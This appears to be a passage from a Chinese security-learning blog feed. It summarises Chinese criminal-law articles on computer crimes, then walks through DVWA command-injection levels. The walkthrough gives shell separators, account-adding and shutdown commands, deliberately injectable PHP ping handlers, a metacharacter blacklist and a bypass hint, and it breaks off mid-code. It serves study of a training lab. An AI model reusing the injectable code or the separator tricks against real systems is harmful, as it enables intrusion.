非法侵入计算机信息系统案（第285条第1款）&#x3D;&#x3D;</h4><ul><li><strong>详细内容</strong>：违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的行为。</li><li><strong>构成要件</strong>：<ul><li><strong>客体</strong>：国家重要计算机信息系统的安全。</li><li><strong>客观方面</strong>：违反国家规定，侵入国家重要计算机信息系统。</li><li><strong>主体</strong>：一般主体。</li><li><strong>主观方面</strong>：故意。</li></ul></li><li><strong>立案标准</strong>：<ul><li>侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统。</li></ul></li><li><strong>量刑标准</strong>：<ul><li>处三年以下有期徒刑或者拘役。</li></ul></li><li><strong>犯罪情形认定</strong>：<ul><li>未经授权，擅自侵入国家重要计算机信息系统。</li></ul></li><li><strong>与其他条款区别</strong>：<ul><li>与非法获取计算机信息系统数据、非法控制计算机信息系统罪不同，本罪强调侵入行为，而非法获取数据、非法控制计算机信息系统罪强调获取数据或控制系统的行为。</li></ul></li></ul><h4 id="4-非法获取计算机信息系统数据、非法控制计算机信息系统案（第285条第2款）"><a href="#4-非法获取计算机信息系统数据、非法控制计算机信息系统案（第285条第2款）" class="headerlink" title="&#x3D;&#x3D;4. 非法获取计算机信息系统数据、非法控制计算机信息系统案（第285条第2款）&#x3D;&#x3D;"></a>&#x3D;&#x3D;4. 非法获取计算机信息系统数据、非法控制计算机信息系统案（第285条第2款）&#x3D;&#x3D;</h4><ul><li><strong>详细内容</strong>：违反国家规定，侵入国家事务、国防建设、尖端科学技术领域以外的计算机信息系统或采用技术手段获取数据、非法控制计算机信息系统，情节严重的行为。</li><li><strong>构成要件</strong>：<ul><li><strong>客体</strong>：国家对计算机信息系统的安全管理制度。</li><li><strong>客观方面</strong>：非法获取数据或非法控制计算机信息系统。</li><li><strong>主体</strong>：一般主体。</li><li><strong>主观方面</strong>：故意。</li></ul></li><li><strong>立案标准</strong>：<ul><li>涉及支付结算、证券交易等身份认证信息达十组以上，或其他身份认证信息五百组以上，或非法控制计算机信息系统二十台以上等情形。</li></ul></li><li><strong>量刑标准</strong>：<ul><li>情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金。</li><li>情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。</li></ul></li><li><strong>犯罪情形认定</strong>：<ul><li>情节严重包括获取大量敏感信息，或非法控制多台计算机信息系统等。</li></ul></li><li><strong>与其他条款区别</strong>：<ul><li>与提供侵入、非法控制计算机信息系统程序、工具罪不同，本罪强调获取数据或控制系统的行为，而提供程序、工具罪强调提供程序、工具的行为。</li></ul></li></ul><h4 id="5-提供侵入、非法控制计算机信息系统程序、工具案（第285条第3款）"><a href="#5-提供侵入、非法控制计算机信息系统程序、工具案（第285条第3款）" class="headerlink" title="&#x3D;&#x3D;5. 提供侵入、非法控制计算机信息系统程序、工具案（第285条第3款）&#x3D;&#x3D;"></a>&#x3D;&#x3D;5. 提供侵入、非法控制计算机信息系统程序、工具案（第285条第3款）&#x3D;&#x3D;</h4><ul><li><strong>详细内容</strong>：提供专门用于侵入、非法控制计算机信息系统的程序、工具，情节严重的行为。</li><li><strong>构成要件</strong>：<ul><li><strong>客体</strong>：国家对计算机信息系统的安全管理制度。</li><li><strong>客观方面</strong>：提供侵入、非法控制程序、工具。</li><li><strong>主体</strong>：一般主体。</li><li><strong>主观方面</strong>：故意。</li></ul></li><li><strong>立案标准</strong>：<ul><li>提供程序、工具导致他人成功侵入、非法控制计算机信息系统，或违法所得五千元以上等情形。</li></ul></li><li><strong>量刑标准</strong>：<ul><li>情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金。</li><li>情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。</li></ul></li><li><strong>犯罪情形认定</strong>：<ul><li>情节严重包括提供程序、工具被大量使用，或造成严重后果等。</li></ul></li><li><strong>与其他条款区别</strong>：<ul><li>与非法侵入、非法控制计算机信息系统罪不同，本罪强调提供程序、工具的行为，而非法侵入、非法控制罪强调侵入、控制的行为。</li></ul></li></ul><h4 id="6-破坏计算机信息系统案（第286条）"><a href="#6-破坏计算机信息系统案（第286条）" class="headerlink" title="&#x3D;&#x3D;6. 破坏计算机信息系统案（第286条）&#x3D;&#x3D;"></a>&#x3D;&#x3D;6. 破坏计算机信息系统案（第286条）&#x3D;&#x3D;</h4><ul><li><strong>详细内容</strong>：违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，或对计算机信息系统中存储、处理、传输的数据和应用程序进行删除、修改、增加，或故意制作、传播计算机病毒等破坏性程序，影响计算机信息系统正常运行，后果严重的行为。</li><li><strong>构成要件</strong>：<ul><li><strong>客体</strong>：国家对计算机信息系统的安全管理制度。</li><li><strong>客观方面</strong>：破坏计算机信息系统的行为。</li><li><strong>主体</strong>：一般主体。</li><li><strong>主观方面</strong>：故意。</li></ul></li><li><strong>立案标准</strong>：<ul><li>导致计算机信息系统功能部分或全部丧失，或造成重大经济损失等情形。</li></ul></li><li><strong>量刑标准</strong>：<ul><li>后果严重的，处五年以下有期徒刑或者拘役。</li><li>后果特别严重的，处五年以上有期徒刑。</li></ul></li><li><strong>犯罪情形认定</strong>：<ul><li>后果严重包括造成重大经济损失，或严重影响社会秩序等。</li></ul></li><li><strong>与其他条款区别</strong>：<ul><li>与非法侵入、非法控制计算机信息系统罪不同，本罪强调破坏行为，而非法侵入、非法控制罪强调侵入、控制行为。</li></ul></li></ul><h4 id="7-拒不履行信息网络安全管理义务案（第286条之一）"><a href="#7-拒不履行信息网络安全管理义务案（第286条之一）" class="headerlink" title="&#x3D;&#x3D;7. 拒不履行信息网络安全管理义务案（第286条之一）&#x3D;&#x3D;"></a>&#x3D;&#x3D;7. 拒不履行信息网络安全管理义务案（第286条之一）&#x3D;&#x3D;</h4><ul><li><strong>详细内容</strong>：网络服务提供者不履行法律、行政法规规定的信息网络安全管理义务，经监管部门责令改正而拒不改正，情节严重的行为。</li><li><strong>构成要件</strong>：<ul><li><strong>客体</strong>：国家对信息网络安全的管理秩序。</li><li><strong>客观方面</strong>：拒不履行信息网络安全管理义务。</li><li><strong>主体</strong>：特殊主体，即网络服务提供者。</li><li><strong>主观方面</strong>：故意。</li></ul></li><li><strong>立案标准</strong>：<ul><li>致使违法信息大量传播，或用户信息泄露造成严重后果等情形。</li></ul></li><li><strong>量刑标准</strong>：<ul><li>情节严重的，处三年以下有期徒刑、拘役或者管制，并处或者单处罚金。</li></ul></li><li><strong>犯罪情形认定</strong>：<ul><li>经监管部门责令改正而拒不改正，且情节严重。</li></ul></li><li><strong>与其他条款区别</strong>：<ul><li>与帮助信息网络犯罪活动罪不同，本罪强调网络服务提供者不履行管理义务，而帮助信息网络犯罪活动罪强调为信息网络犯罪提供帮助。</li></ul></li></ul><h4 id="8-非法利用信息网络案（第287条之一）"><a href="#8-非法利用信息网络案（第287条之一）" class="headerlink" title="8. 非法利用信息网络案（第287条之一）"></a>8. 非法利用信息网络案（第287条之一）</h4><ul><li><strong>详细内容</strong>：利用信息网络设立用于实施诈骗、传授犯罪方法等违法犯罪活动的网站、通讯群组，或发布有关违法犯罪信息，或为实施诈骗等违法犯罪活动发布信息，情节严重的行为。</li><li><strong>构成要件</strong>：<ul><li><strong>客体</strong>：国家对信息网络的管理秩序。</li><li><strong>客观方面</strong>：非法利用信息网络的行为。</li><li><strong>主体</strong>：一般主体。</li><li><strong>主观方面</strong>：故意。</li></ul></li><li><strong>立案标准</strong>：<ul><li>设立违法犯罪网站、通讯群组，或发布违法犯罪信息达一定数量等情形。</li></ul></li><li><strong>量刑标准</strong>：<ul><li>情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金。</li></ul></li><li><strong>犯罪情形认定</strong>：<ul><li>情节严重包括设立多个违法犯罪网站、通讯群组，或发布大量违法犯罪信息等。</li></ul></li><li><strong>与其他条款区别</strong>：<ul><li>与编造、故意传播虚假信息罪不同，本罪强调利用信息网络实施违法犯罪活动，而编造、故意传播虚假信息罪强调编造、传播虚假信息的行为。</li></ul></li></ul><h4 id="9-帮助信息网络犯罪活动案（第287条之二）"><a href="#9-帮助信息网络犯罪活动案（第287条之二）" class="headerlink" title="9. 帮助信息网络犯罪活动案（第287条之二）"></a>9. 帮助信息网络犯罪活动案（第287条之二）</h4><ul><li><strong>详细内容</strong>：明知他人利用信息网络实施犯罪，为其犯罪提供互联网接入、服务器托管、网络存储、通讯传输等技术支持，或提供广告推广、支付结算等帮助，情节严重的行为。</li><li><strong>构成要件</strong>：<ul><li><strong>客体</strong>：国家对信息网络的管理秩序。</li><li><strong>客观方面</strong>：提供技术支持或帮助。</li><li><strong>主体</strong>：一般主体。</li><li><strong>主观方面</strong>：故意。</li></ul></li><li><strong>立案标准</strong>：<ul><li>为三个以上对象提供帮助，或支付结算金额二十万元以上等情形。</li></ul></li><li><strong>量刑标准</strong>：<ul><li>情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金。</li></ul></li><li><strong>犯罪情形认定</strong>：<ul><li>情节严重包括为多个犯罪对象提供帮助，或提供大量资金支持等。</li></ul></li><li><strong>与其他条款区别</strong>：<ul><li>与非法利用信息网络罪不同，本罪强调为信息网络犯罪提供帮助，而非法利用信息网络罪强调利用信息网络实施违法犯罪活动。</li></ul></li></ul><h4 id="10-编造、故意传播虚假信息案（第291条之一第2款）"><a href="#10-编造、故意传播虚假信息案（第291条之一第2款）" class="headerlink" title="10. 编造、故意传播虚假信息案（第291条之一第2款）"></a>10. 编造、故意传播虚假信息案（第291条之一第2款）</h4><ul><li><strong>详细内容</strong>：编造虚假的险情、疫情、灾情、警情，在信息网络或其他媒体上传播，或明知是上述虚假信息，故意在信息网络或其他媒体上传播，严重扰乱社会秩序的行为。</li><li><strong>构成要件</strong>：<ul><li><strong>客体</strong>：国家对信息网络的管理秩序和社会公共秩序。</li><li><strong>客观方面</strong>：编造、传播虚假信息。</li><li><strong>主体</strong>：一般主体。</li><li><strong>主观方面</strong>：故意。</li></ul></li><li><strong>立案标准</strong>：<ul><li>诽谤他人造成恶劣影响，或造成公共秩序严重混乱等情形。</li></ul></li><li><strong>量刑标准</strong>：<ul><li>严重扰乱社会秩序的，处三年以下有期徒刑、拘役或者管制。</li><li>造成严重后果的，处三年以上七年以下有期徒刑。</li></ul></li><li><strong>犯罪情形认定</strong>：<ul><li>编造、传播虚假信息导致社会恐慌，或严重影响社会秩序等。</li></ul></li><li><strong>与其他条款区别</strong>：<ul><li>与诽谤罪不同，本罪强调编造、传播特定类型的虚假信息，而诽谤罪强调捏造事实损害他人名誉。</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>常见网站漏洞（持续更新）</title>
      <link href="/2025/03/02/%E5%B8%B8%E8%A7%81%E7%BD%91%E7%AB%99%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
      <url>/2025/03/02/%E5%B8%B8%E8%A7%81%E7%BD%91%E7%AB%99%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>在互联网中，web服务数量庞大，且易存在安全漏洞，是渗透测试前期攻击的不二之选<br>常见网站漏洞有哪些？<br>    SQL注入、XSS、文件上传、反序列化、文件包含、CSRF、命令执行、信息泄露、XXE、SSRF、未授权访问</p><ul><li>SQL注入：泄露破坏数据库，数据库中可能有账号密码等敏感信息</li><li>命令执行：获取目标机器命令权限，执行非法命令，破坏或控制受害机</li><li>文件上传：上传后门病毒木马到网站中，破坏网站甚至系统</li></ul><h1 id="漏洞靶场之DVWA"><a href="#漏洞靶场之DVWA" class="headerlink" title="漏洞靶场之DVWA"></a>漏洞靶场之DVWA</h1><p>DVWA是OWASP官方编写的PHP网站，包含了各种网站常见漏洞，可以学习攻击及修复方式</p><h2 id="DVWA搭建"><a href="#DVWA搭建" class="headerlink" title="DVWA搭建"></a>DVWA搭建</h2><p>如何搭建？</p><ol><li>PHP环境：<br> windows apache mysql php</li><li>DVWA源代码：<blockquote><p><a href="https://github.com/digininja/DVWA/archive/master.zip">https://github.com/digininja/DVWA/archive/master.zip</a></p></blockquote></li></ol><h1 id="命令执行漏洞详解"><a href="#命令执行漏洞详解" class="headerlink" title="命令执行漏洞详解"></a>命令执行漏洞详解</h1><p><strong>危害巨大的漏洞-命令执行</strong></p><p>一般出现这种漏洞，是因为应用系统从设计上需要<strong>给<u>用户提供指定的远程命令操作的接口</u>（也就是输入框这种拿去给服务端执行命令满足客户端要求的接口</strong>）比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后后台会对该IP地址进行一次ping测试并返回测试结果。<u>而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交恶意命令</u>，让后台进行执行，从而获得后台服务器权限</p><blockquote><p><strong>补充知识：命令连接符</strong></p><p>cmd1|cmd2：无论cmd1是否执行成功，cmd2将被执行<br>cmd1;cmd2：无论cmd1是否执行成功，cmd2将被执行<br>cmd1&amp;cmd2：无论cmd1是否执行成功，cmd2将被执行<br>cmd1||cmd2：仅在cmd1执行失败时才执行cmd2（||用于linux操作系统）<br>cmd1&amp;&amp;cmd2：仅在cmd1执行成功后时才执行</p></blockquote><p> 常用的cmd命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">whoami 查看当前用户名 </span><br><span class="line"><span class="built_in">ipconfig</span> 查看网卡信息</span><br><span class="line">shutdown -s -t <span class="number">0</span> 立即关机</span><br><span class="line"><span class="built_in">net</span> user [username] [password] /add 增加一个用户名为username密码为password的新用户</span><br><span class="line"><span class="built_in">type</span> [file_name] 查看filename文件内容</span><br></pre></td></tr></table></figure><h2 id="low防御"><a href="#low防御" class="headerlink" title="low防御"></a>low防御</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;    </span><br><span class="line"><span class="comment">// Get input    </span></span><br><span class="line"><span class="variable">$target </span>= <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];    </span><br><span class="line"><span class="comment">// Determine OS and execute the ping command.    </span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;        </span><br><span class="line"><span class="comment">// Windows        </span></span><br><span class="line"><span class="variable">$cmd </span>= <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target </span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span> &#123;        </span><br><span class="line"><span class="comment">// *nix        </span></span><br><span class="line"><span class="variable">$cmd </span>= <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target </span>);  </span><br><span class="line">&#125;    </span><br><span class="line"><span class="comment">// Feedback for the end user    </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>防御low级命令执行的最高效方法就是过滤命令连接符，在medium中可以看到</p><h2 id="medium防御"><a href="#medium防御" class="headerlink" title="medium防御"></a>medium防御</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line"><span class="comment">// Get input    </span></span><br><span class="line"><span class="variable">$target </span>= <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"><span class="comment">// Set blacklist    </span></span><br><span class="line"><span class="variable">$substitutions </span>= <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,  </span><br><span class="line">);    </span><br><span class="line"><span class="comment">// Remove any of the characters in the array (blacklist).</span></span><br><span class="line"><span class="variable">$target </span>= <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions </span>), <span class="variable">$substitutions</span>, <span class="variable">$target </span>);</span><br><span class="line"><span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line"><span class="comment">// Windows        </span></span><br><span class="line"><span class="variable">$cmd </span>= <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target </span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span> &#123;        </span><br><span class="line"><span class="comment">// *nix        </span></span><br><span class="line"><span class="variable">$cmd </span>= <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target </span>);  </span><br><span class="line">&#125;   </span><br><span class="line"><span class="comment">// Feedback for the end user   </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看见<br><code>$substitutions = array(</code><br><code>&#39;&amp;&amp;&#39; =&gt; &#39;&#39;,</code><br><code>&#39;;&#39;  =&gt; &#39;&#39;,</code><br><code>);</code> <br>这一段把用户输入的“&amp;&amp;”和“；”改为了空格，但并没有把所有命令连接符（实际上也确实依旧可以使用其他几个，所以我也没懂何意味）</p><p><strong>渗透测试中如何知道它的防御等级</strong></p><ol><li>能看源码直接看源码</li><li>看不到源码依次尝试常见命令连接符</li></ol><h2 id="high防御"><a href="#high防御" class="headerlink" title="high防御"></a>high防御</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;    </span><br><span class="line"><span class="comment">// Get input    </span></span><br><span class="line"><span class="variable">$target </span>= <span class="title function_ invoke__">trim</span>(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);    </span><br><span class="line"><span class="comment">// Set blacklist    </span></span><br><span class="line"><span class="variable">$substitutions </span>= <span class="keyword">array</span>(        </span><br><span class="line"><span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,        </span><br><span class="line"><span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,        </span><br><span class="line"><span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,        </span><br><span class="line"><span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,        </span><br><span class="line"><span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,        </span><br><span class="line"><span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,        </span><br><span class="line"><span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,        </span><br><span class="line"><span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,        </span><br><span class="line"><span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,  </span><br><span class="line">);    </span><br><span class="line"><span class="comment">// Remove any of the characters in the array (blacklist).    </span></span><br><span class="line"><span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>(<span class="variable">$substitutions</span>),<span class="variable">$substitutions</span>,<span class="variable">$target</span>);    </span><br><span class="line"><span class="comment">// Determine OS and execute the ping command.    </span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;        </span><br><span class="line"><span class="comment">// Windows        </span></span><br><span class="line"><span class="variable">$cmd </span>= <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target </span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span> &#123;        </span><br><span class="line"><span class="comment">// *nix        </span></span><br><span class="line"><span class="variable">$cmd </span>= <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target </span>);  </span><br><span class="line">&#125;    </span><br><span class="line"><span class="comment">// Feedback for the end user    </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>与medium的区别在于把一大堆符号都拦截了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$substitutions </span>= <span class="keyword">array</span>(        </span><br><span class="line"><span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,        </span><br><span class="line"><span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,        </span><br><span class="line"><span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,        </span><br><span class="line"><span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,    <span class="comment">//注意左边|右边有个空格    </span></span><br><span class="line"><span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,        </span><br><span class="line"><span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,        </span><br><span class="line"><span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,        </span><br><span class="line"><span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,        </span><br><span class="line"><span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,  </span><br><span class="line">);    </span><br></pre></td></tr></table></figure><p>但是万一<del>有些闲着蛋疼爱敲空格的</del>开发者在待转化的字符前或后多加了一个空格，那就不好说了，比如上面</p><h2 id="impossible防御"><a href="#impossible防御" class="headerlink" title="impossible防御"></a>impossible防御</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>      </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;    </span><br><span class="line"><span class="comment">// Check Anti-CSRF token    </span></span><br><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"><span class="comment">// Get input    </span></span><br><span class="line"><span class="variable">$target </span>= <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];    </span><br><span class="line"><span class="variable">$target </span>= <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target </span>);    </span><br><span class="line"><span class="comment">// Split the IP into 4 octects    </span></span><br><span class="line"><span class="variable">$octet </span>= <span class="title function_ invoke__">explode</span>( <span class="string">&quot;.&quot;</span>, <span class="variable">$target </span>);    </span><br><span class="line"><span class="comment">// Check IF each octet is an integer    </span></span><br><span class="line"><span class="keyword">if</span>( ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">sizeof</span>( <span class="variable">$octet </span>) == <span class="number">4</span> ) ) &#123;       </span><br><span class="line"><span class="comment">// If all 4 octets are int&#x27;s put the IP back together.        </span></span><br><span class="line"><span class="variable">$target </span>= <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];        </span><br><span class="line"><span class="comment">// Determine OS and execute the ping command.        </span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;            </span><br><span class="line"><span class="comment">// Windows            </span></span><br><span class="line"><span class="variable">$cmd </span>= <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target </span>);           </span><br><span class="line">&#125;           </span><br><span class="line"><span class="keyword">else</span> &#123;            </span><br><span class="line"><span class="comment">// *nix            </span></span><br><span class="line"><span class="variable">$cmd </span>= <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target </span>);           </span><br><span class="line">&#125;        </span><br><span class="line"><span class="comment">// Feedback for the end user        </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;        </span><br><span class="line"><span class="comment">// Ops. Let the 